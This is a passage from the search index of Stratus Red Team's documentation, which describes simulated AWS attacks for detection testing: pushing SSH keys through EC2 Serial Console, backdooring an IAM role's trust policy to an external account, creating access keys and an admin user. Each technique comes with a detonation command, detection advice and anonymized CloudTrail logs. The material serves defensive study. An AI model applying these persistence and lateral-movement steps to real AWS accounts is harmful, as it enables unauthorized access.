    \"arn\": \"arn:aws:iam::572910899909:user/christophe\",\n         \"principalId\": \"AIDAHG2QGAX7XGTRYBZ5\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"eu-south-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"803d3bd8-44cb-4284-a4a9-cdfde3b00570\",\n      \"eventName\": \"SendSSHPublicKey\",\n      \"eventSource\": \"ec2-instance-connect.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T13:24:47Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"572910899909\",\n      \"requestID\": \"98b43826-b4f9-4606-bb34-191e73734cfd\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-9d2abfF1798C34950\",\n         \"instanceOSUser\": \"ec2-user\",\n         \"sSHPublicKey\": \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtAlK45MAEWZ7MUY2QEmi3M6W+peGL3VCrc0qH54xRu\"\n      },\n      \"responseElements\": {\n         \"requestId\": \"98b43826-b4f9-4606-bb34-191e73734cfd\",\n         \"success\": true\n      },\n      \"sourceIPAddress\": \"246.227.146.251\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2-instance-connect.eu-south-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_84a22508-bcc6-424d-9973-3f841ebf8875\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAGM9ZC9KUL0AYEVUM\",\n         \"accountId\": \"572910899909\",\n         \"arn\": \"arn:aws:iam::572910899909:user/christophe\",\n         \"principalId\": \"AIDAHG2QGAX7XGTRYBZ5\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.lateral-movement.ec2-serial-console-send-ssh-public-key/","title":"Usage of EC2 Serial Console to push SSH public key","text":"<p>slow idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.lateral-movement.ec2-serial-console-send-ssh-public-key/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Lateral Movement</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.lateral-movement.ec2-serial-console-send-ssh-public-key/#description","title":"Description","text":"<p>Simulates an attacker using EC2 Instance Connect to push an SSH public key to multiple EC2 instances, using <code>SendSerialConsoleSSHPublicKey</code>. This allows anyone  with the corresponding private key to connect directly to the systems via SSH, assuming they have appropriate network connectivity.</p> <p>Warm-up:</p> <ul> <li>Create multiple EC2 instances and a VPC (takes a few minutes).</li> </ul> <p>Detonation:</p> <ul> <li>Adds a public SSH key to the EC2 instances using <code>SendSerialConsoleSSHPublicKey</code>.</li> </ul> <p>References:</p> <ul> <li>https://docs.aws.amazon.com/ec2-instance-connect/latest/APIReference/API_SendSerialConsoleSSHPublicKey.html</li> <li>https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud</li> <li>https://fwdcloudsec.org/assets/presentations/2024/europe/sebastian-walla-cloud-conscious-tactics-techniques-and-procedures-an-overview.pdf</li> <li>https://unit42.paloaltonetworks.com/cloud-lateral-movement-techniques/</li> <li>https://unit42.paloaltonetworks.com/cloud-virtual-machine-attack-vectors/</li> </ul>"},{"location":"attack-techniques/AWS/aws.lateral-movement.ec2-serial-console-send-ssh-public-key/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.lateral-movement.ec2-serial-console-send-ssh-public-key\n</code></pre>"},{"location":"attack-techniques/AWS/aws.lateral-movement.ec2-serial-console-send-ssh-public-key/#detection","title":"Detection","text":"<p>Identify, through CloudTrail's <code>SendSerialConsoleSSHPublicKey</code> event, when a user is adding an SSH key to EC2 instances.</p>"},{"location":"attack-techniques/AWS/aws.lateral-movement.ec2-serial-console-send-ssh-public-key/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li> <p><code>ec2-instance-connect:SendSerialConsoleSSHPublicKey</code></p> </li> <li> <p><code>ec2:EnableSerialConsoleAccess</code></p> </li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"cniso-east-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"37ba412b-f943-44f2-ae48-4527f6e789d9\",\n      \"eventName\": \"EnableSerialConsoleAccess\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-11-26T15:35:22Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.10\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"844015365555\",\n      \"requestID\": \"e110338f-cc06-4284-bf16-6528a7df1561\",\n      \"requestParameters\": {\n         \"EnableSerialConsoleAccessRequest\": \"\"\n      },\n      \"responseElements\": {\n         \"EnableSerialConsoleAccessResponse\": {\n            \"requestId\": \"e110338f-cc06-4284-bf16-6528a7df1561\",\n            \"serialConsoleAccessEnabled\": true,\n            \"xmlns\": \"http://ec2.amazonaws.com/doc/2016-11-15/\"\n         }\n      },\n      \"sourceIPAddress\": \"201.252.42.03\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.cniso-east-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_b0fedc91-bd4a-4ba1-a776-80e707fef2a0\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA2HJRQF0DHNYEE9N1\",\n         \"accountId\": \"844015365555\",\n         \"arn\": \"arn:aws:sts::844015365555:assumed-role/AWSReservedSSOrandoml3I7nL6f7BmB@gmail.com\",\n         \"principalId\": \"AROAEMHZD694LU95MUYOP:randomca0L529zwNAY@gmail.com\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-11-26T15:14:58Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"844015365555\",\n               \"arn\": \"arn:aws:iam::844015365555:role/aws-reserved/sso.amazonaws.com/AWSReservedSSO_account-admin_599c9e90e350d2ff\",\n               \"principalId\": \"AROAEMHZD694LU95MUYOP\",\n               \"type\": \"Role\",\n               \"userName\": \"AWSReservedSSO_account-admin_599c9e90e350d2ff\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"cniso-east-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"787b2464-f27b-4d4c-91bc-6396f2297d0e\",\n      \"eventName\": \"SendSerialConsoleSSHPublicKey\",\n      \"eventSource\": \"ec2-instance-connect.amazonaws.com\",\n      \"eventTime\": \"2024-11-26T15:35:23Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"844015365555\",\n      \"requestID\": \"c74b1e77-bc91-4174-b297-d06a71c89abf\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-EFCb4e480CAbc4CF9\",\n         \"monitorMode\": false,\n         \"sSHPublicKey\": \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtAlK45MAEWZ7MUY2QEmi3M6W+peGL3VCrc0qH54xRu\",\n         \"serialPort\": 0\n      },\n      \"responseElements\": {\n         \"requestId\": \"c74b1e77-bc91-4174-b297-d06a71c89abf\",\n         \"success\": true\n      },\n      \"sourceIPAddress\": \"201.252.42.03\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2-instance-connect.cniso-east-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_b0fedc91-bd4a-4ba1-a776-80e707fef2a0\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA2HJRQF0DHNYEE9N1\",\n         \"accountId\": \"844015365555\",\n         \"arn\": \"arn:aws:sts::844015365555:assumed-role/AWSReservedSSOrandoml3I7nL6f7BmB@gmail.com\",\n         \"principalId\": \"AROAEMHZD694LU95MUYOP:randomca0L529zwNAY@gmail.com\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-11-26T15:14:58Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"844015365555\",\n               \"arn\": \"arn:aws:iam::844015365555:role/aws-reserved/sso.amazonaws.com/AWSReservedSSO_account-admin_599c9e90e350d2ff\",\n               \"principalId\": \"AROAEMHZD694LU95MUYOP\",\n               \"type\": \"Role\",\n               \"userName\": \"AWSReservedSSO_account-admin_599c9e90e350d2ff\"\n            },\n            \"webIdFederationData\": {}\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"cniso-east-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"e49972cb-b394-43e2-aab5-602f1fb56f85\",\n      \"eventName\": \"SendSerialConsoleSSHPublicKey\",\n      \"eventSource\": \"ec2-instance-connect.amazonaws.com\",\n      \"eventTime\": \"2024-11-26T15:35:23Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"844015365555\",\n      \"requestID\": \"d392c0ca-351f-472f-9ca3-b411beb9df9c\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-B2ABDCa5b78E0f1dd\",\n         \"monitorMode\": false,\n         \"sSHPublicKey\": \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtAlK45MAEWZ7MUY2QEmi3M6W+peGL3VCrc0qH54xRu\",\n         \"serialPort\": 0\n      },\n      \"responseElements\": {\n         \"requestId\": \"d392c0ca-351f-472f-9ca3-b411beb9df9c\",\n         \"success\": true\n      },\n      \"sourceIPAddress\": \"201.252.42.03\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2-instance-connect.cniso-east-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_b0fedc91-bd4a-4ba1-a776-80e707fef2a0\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA2HJRQF0DHNYEE9N1\",\n         \"accountId\": \"844015365555\",\n         \"arn\": \"arn:aws:sts::844015365555:assumed-role/AWSReservedSSOrandoml3I7nL6f7BmB@gmail.com\",\n         \"principalId\": \"AROAEMHZD694LU95MUYOP:randomca0L529zwNAY@gmail.com\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-11-26T15:14:58Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"844015365555\",\n               \"arn\": \"arn:aws:iam::844015365555:role/aws-reserved/sso.amazonaws.com/AWSReservedSSO_account-admin_599c9e90e350d2ff\",\n               \"principalId\": \"AROAEMHZD694LU95MUYOP\",\n               \"type\": \"Role\",\n               \"userName\": \"AWSReservedSSO_account-admin_599c9e90e350d2ff\"\n            },\n            \"webIdFederationData\": {}\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"cniso-east-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"f4dc86c9-6b22-4643-a0e8-fcb97fcfae68\",\n      \"eventName\": \"SendSerialConsoleSSHPublicKey\",\n      \"eventSource\": \"ec2-instance-connect.amazonaws.com\",\n      \"eventTime\": \"2024-11-26T15:35:22Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"844015365555\",\n      \"requestID\": \"88c8e41e-7754-4377-983f-140f8ca5617e\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-D46eD8FCdefED5aAE\",\n         \"monitorMode\": false,\n         \"sSHPublicKey\": \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtAlK45MAEWZ7MUY2QEmi3M6W+peGL3VCrc0qH54xRu\",\n         \"serialPort\": 0\n      },\n      \"responseElements\": {\n         \"requestId\": \"88c8e41e-7754-4377-983f-140f8ca5617e\",\n         \"success\": true\n      },\n      \"sourceIPAddress\": \"201.252.42.03\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2-instance-connect.cniso-east-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_b0fedc91-bd4a-4ba1-a776-80e707fef2a0\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIA2HJRQF0DHNYEE9N1\",\n         \"accountId\": \"844015365555\",\n         \"arn\": \"arn:aws:sts::844015365555:assumed-role/AWSReservedSSOrandoml3I7nL6f7BmB@gmail.com\",\n         \"principalId\": \"AROAEMHZD694LU95MUYOP:randomca0L529zwNAY@gmail.com\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-11-26T15:14:58Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"844015365555\",\n               \"arn\": \"arn:aws:iam::844015365555:role/aws-reserved/sso.amazonaws.com/AWSReservedSSO_account-admin_599c9e90e350d2ff\",\n               \"principalId\": \"AROAEMHZD694LU95MUYOP\",\n               \"type\": \"Role\",\n               \"userName\": \"AWSReservedSSO_account-admin_599c9e90e350d2ff\"\n            },\n            \"webIdFederationData\": {}\n         },\n         \"type\": \"AssumedRole\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-role/","title":"Backdoor an IAM Role","text":"<p>idempotent </p> <p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-role/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-role/#description","title":"Description","text":"<p>Establishes persistence by backdooring an existing IAM role, allowing it to be assumed from an external AWS account.</p> <p>Warm-up: </p> <ul> <li>Create an IAM role.</li> </ul> <p>Detonation: </p> <ul> <li>Update the assume role policy of the IAM role to backdoor it, making it accessible from an external, fictitious AWS account:</li> </ul> <pre>\n<code>\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"Service\": \"ec2.amazonaws.com\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::193672423079:root\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    }\n  ]\n}\n</code>\n</pre>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-role/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.iam-backdoor-role\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-role/#detection","title":"Detection","text":"<ul> <li> <p>Using CloudTrail's <code>UpdateAssumeRolePolicy</code> event.</p> </li> <li> <p>Through IAM Access Analyzer,  which generates a finding when a role can be assumed from a new AWS account or publicly.</p> </li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-role/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li><code>iam:UpdateAssumeRolePolicy</code></li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"ca-isob-northsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"62e290e2-ee95-4a7c-a9f8-db4ef462b12d\",\n      \"eventName\": \"UpdateAssumeRolePolicy\",\n      \"eventSource\": \"iam.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T13:29:57Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"751203476945\",\n      \"requestID\": \"295ee6e3-1da9-416f-885d-ad65d876ef82\",\n      \"requestParameters\": {\n         \"policyDocument\": \"{\\n  \\\"Version\\\": \\\"2012-10-17\\\",\\n  \\\"Statement\\\": [\\n    {\\n      \\\"Effect\\\": \\\"Allow\\\",\\n      \\\"Principal\\\": {\\n        \\\"Service\\\": \\\"ec2.amazonaws.com\\\"\\n      },\\n      \\\"Action\\\": \\\"sts:AssumeRole\\\"\\n    },\\n    {\\n      \\\"Effect\\\": \\\"Allow\\\",\\n      \\\"Principal\\\": {\\n        \\\"AWS\\\": \\\"arn:aws:iam::193672423079:root\\\"\\n      },\\n      \\\"Action\\\": \\\"sts:AssumeRole\\\"\\n    }\\n  ]\\n}\",\n         \"roleName\": \"stratus-red-team-backdoor-r-role\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"225.178.039.250\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"iam.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_180e078f-4ad3-40c5-9ec3-efff37e17b25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAMUV7B57OZM0RV05D\",\n         \"accountId\": \"751203476945\",\n         \"arn\": \"arn:aws:iam::751203476945:user/christophe\",\n         \"principalId\": \"AIDA7SLGLLJ9LWK18E4Y\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-user/","title":"Create an Access Key on an IAM User","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-user/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> <li> <p>Privilege Escalation</p> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li>Account Manipulation: Additional Cloud Credentials (T1098.001)</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-user/#description","title":"Description","text":"<p>Establishes persistence by creating an access key on an existing IAM user.</p> <p>Warm-up: </p> <ul> <li>Create an IAM user.</li> </ul> <p>Detonation: </p> <ul> <li>Create an IAM access key on the user.</li> </ul> <p>References:</p> <ul> <li>https://sysdig.com/blog/scarleteel-2-0/</li> <li>https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-user/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.iam-backdoor-user\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-user/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>CreateAccessKey</code> event. This event can hardly be considered suspicious by itself, unless correlated with other indicators. '</p>"},{"location":"attack-techniques/AWS/aws.persistence.iam-backdoor-user/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li><code>iam:CreateAccessKey</code></li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"ap-central-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"c64c4ded-ef03-4e5c-81eb-153b118d72f2\",\n      \"eventName\": \"CreateAccessKey\",\n      \"eventSource\": \"iam.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:53:13Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"946986569305\",\n      \"requestID\": \"1af58177-d743-4c94-ac1d-014721ed9b94\",\n      \"requestParameters\": {\n         \"userName\": \"stratus-red-team-backdoor-u-user\"\n      },\n      \"responseElements\": {\n         \"accessKey\": {\n            \"accessKeyId\": \"AKIAL80DWDVKKM0UXEER\",\n            \"createDate\": \"Jul 30, 2024 9:53:13 PM\",\n            \"status\": \"Active\",\n            \"userName\": \"stratus-red-team-backdoor-u-user\"\n         }\n      },\n      \"sourceIPAddress\": \"211.9.016.253\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"iam.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_f3f19dcd-8552-47ca-a01e-0e1f5578d15e\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA30BEZSJBVKOFKZW0\",\n         \"accountId\": \"946986569305\",\n         \"arn\": \"arn:aws:iam::946986569305:user/christophe\",\n         \"principalId\": \"AIDAKYRO1QIPZ5M62HCS\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using LogLicker.\u00a0\u21a9</p> </li> </ol>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-admin-user/","title":"Create an administrative IAM User","text":"<p>Platform: AWS</p>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-admin-user/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Persistence</li> </ul> </li> <li> <p>Privilege Escalation</p> </li> <li> <p>Threat Technique Catalog for AWS:</p> <ul> <li>Create Account: Create Cloud Account (T1136.003)</li> </ul> </li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-admin-user/#description","title":"Description","text":"<p>Establishes persistence by creating a new IAM user with administrative permissions.</p> <p>Warm-up: None.</p> <p>Detonation: </p> <ul> <li>Create the IAM user and attach the 'AdministratorAccess' managed IAM policy to it.</li> </ul> <p>References:</p> <ul> <li>https://permiso.io/blog/s/approach-to-detection-androxgh0st-greenbot-persistence/</li> <li>https://permiso.io/blog/s/unmasking-guivil-new-cloud-threat-actor/</li> <li>https://blog.darklab.hk/2021/07/06/trouble-in-paradise/</li> <li>https://expel.com/blog/incident-report-from-cli-to-console-chasing-an-attacker-in-aws/</li> <li>https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud</li> <li>https://permiso.io/blog/s/anatomy-of-attack-exposed-keys-to-crypto-mining/</li> <li>https://www.invictus-ir.com/news/the-curious-case-of-dangerdev-protonmail-me</li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-admin-user/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate aws.persistence.iam-create-admin-user\n</code></pre>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-admin-user/#detection","title":"Detection","text":"<p>Through CloudTrail's <code>CreateUser</code>, <code>AttachUserPolicy</code> and <code>CreateAccessKey</code> events.</p> <p>While matching on these events may be impractical and prone to false positives in most environments, the following can help to craft more precise detections:</p> <ul> <li> <p>Identify a call to <code>CreateUser</code> closely followed by <code>AttachUserPolicy</code> with an administrator policy.</p> </li> <li> <p>Identify a call to <code>CreateUser</code> resulting in an access denied error.</p> </li> </ul>"},{"location":"attack-techniques/AWS/aws.persistence.iam-create-admin-user/#detonation-logs-new","title":"Detonation logs new!","text":"<p>The following CloudTrail events are generated when this technique is detonated<sup>1</sup>:</p> <ul> <li> <p><code>iam:AttachUserPolicy</code></p> </li> <li> <p><code>iam:CreateAccessKey</code></p> </li> <li> <p><code>iam:CreateUser</code></p> </li> </ul> View raw detonation logs <pre><code>[\n   {\n      \"awsRegion\": \"ap-isob-central-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"083dc4ad-e264-46bc-a407-d0dd31b58bdc\",\n      \"eventName\": \"AttachUserPolicy\",\n      \"eventSource\": \"iam.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T13:33:28Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"229654561268\",\n      \"requestID\": \"710f2703-6e8a-46d5-9924-b12a3a681755\",\n      \"requestParameters\": {\n         \"policyArn\": \"arn:aws:iam::aws:policy/AdministratorAccess\",\n         \"userName\": \"malicious-iam-user\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"075.050.255.67\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"iam.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_6bf00313-712c-4fd2-9bdd-88f48a4b1282\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAOZUDECYXYM4ONAN4\",\n         \"accountId\": \"229654561268\",\n         \"arn\": \"arn:aws:iam::229654561268:user/christophe\",\n         \"principalId\": \"AIDAZ49AHUAJ9OEK73O5\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ap-isob-central-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"94faedcc-0fa4-46e6-9322-022e8e934f04\",\n      \"eventName\": \"CreateAccessKey\",\n      \"eventSource\": \"iam.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T13:33:28Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"229654561268\",\n      \"requestID\": \"0ee5fc85-66bb-4602-a69e-9a5a2a3add30\",\n      \"requestParameters\": {\n         \"userName\": \"malicious-iam-user\"\n      },\n      \"responseElements\": {\n         \"accessKey\": {\n            \"accessKeyId\": \"AKIAXAFZN8JEPF6L682H\",\n            \"createDate\": \"Aug 1, 2024 1:33:28 PM\",\n            \"status\": \"Active\",\n            \"userName\": \"malicious-iam-user\"\n         }\n      },\n      \"sourceIPAddress\": \"075.050.255.67\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"iam.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_6bf00313-712c-4fd2-9bdd-88f48a4b1282\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAOZUDECYXYM4ONAN4\",\n         \"accountId\": \"229654561268\",\n         \"arn\": \"arn:aws:iam::229654561268:user/christophe\",\n         \"principalId\": \"AIDAZ49AHUAJ9OEK73O5\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"ap-isob-central-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"3346344c-5a3e-429e-8405-420f98f75d6e\",\n      \"eventName\": \"CreateUser\",\n      \"eventSource\": \"iam.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T13:33:28Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": false,\n      \"recipientAccountId\": \"229654561268\",\n      \"requestID\": \"64ef9c47-6b64-4c0e-8c32-eb9ffaf8a658\",\n      \"requestParameters\": {\n         \"tags\": [\n            {\n               \"key\": \"StratusRedTeam\",\n               \"value\": \"true\"\n            }\n         ],\n         \"userName\": \"malicious-iam-user\"\n      },\n      \"responseElements\": {\n         \"user\": {\n            \"arn\": \"arn:aws:iam::229654561268:user/malicious-iam-user\",\n            \"createDate\": \"Aug 1, 2024 1:33:28 PM\",\n            \"path\": \"/\",\n            \"tags\": [\n               {\n                  \"key\": \"StratusRedTeam\",\n                  \"value\": \"true\"\n               }\n            ],\n            \"userId\": \"AIDAL1XMLVWIUOK8KAF0\",\n            \"userName\": \"malicious-iam-user\"\n         }\n      },\n      \"sourceIPAddress\": \"075.050.255.67\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"iam.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_6bf00313-712c-4fd2-9bdd-88f48a4b1282\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAOZUDECYXYM4ONAN4\",\n         \"accountId\": \"229654561268\",\n         \"arn\": \"arn:aws:iam::229654561268:user/christophe\",\n         \"principalId\": \"AIDAZ49AHUAJ9OEK73O5\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   }\n]\n</code></pre> <ol> <li> <p>These logs have been gathered from a real detonation of this technique in a test environment using Grimoire, and anonymized using 